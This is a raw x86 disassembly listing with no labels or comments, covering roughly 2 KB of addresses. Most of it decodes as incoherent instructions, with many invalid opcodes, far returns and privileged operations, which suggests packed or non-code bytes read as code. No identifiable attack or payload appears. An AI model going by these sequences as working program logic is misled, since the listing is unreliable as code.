  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
